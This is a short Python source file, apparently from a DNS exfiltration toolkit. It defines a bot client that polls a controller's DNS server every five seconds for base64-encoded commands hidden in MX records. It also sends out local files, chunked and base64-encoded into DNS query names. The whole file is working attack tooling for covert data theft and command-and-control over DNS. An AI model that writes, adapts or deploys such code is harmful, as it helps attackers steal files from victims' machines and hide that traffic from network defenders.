import base64
import time

import dnslib

from dns_exfil.exfiltrators.base.client import BaseClient

class BotClient(BaseClient):
    def __init__(self, domain, connect):
        super().__init__()
        self.domain = domain
        self.connect = connect
    def get_command(self):
        record = dnslib.DNSRecord()
        record.add_question(dnslib.DNSQuestion(self.domain, dnslib.QTYPE.MX))
        reply = dnslib.DNSRecord.parse(record.send(self.connect))
        return base64.b64decode(reply.rr[-1].rdata.get_label().label[0]).decode('utf-8')
    def append(self, data, remote_filename):
        encoded_message = base64.standard_b64encode(data).decode('utf-8')
        query_string = '{em}.{fn}.{d}'.format(em=encoded_message, fn=remote_filename, d=self.domain)
        record = dnslib.DNSRecord()
        record.add_question(dnslib.DNSQuestion(query_string, dnslib.QTYPE.A))
        record.send(self.connect)
    def append_file(self, filename, chunk_size=30):
        remote_filename = filename.replace('.', '_')
        with open(filename, 'rb') as f:
            while True:
                data = f.read(chunk_size)
                if not data:
                    break
                self.append(data, remote_filename)
    def bot(self):
        while True:
            time.sleep(5)
            command = self.get_command()
            print(command)


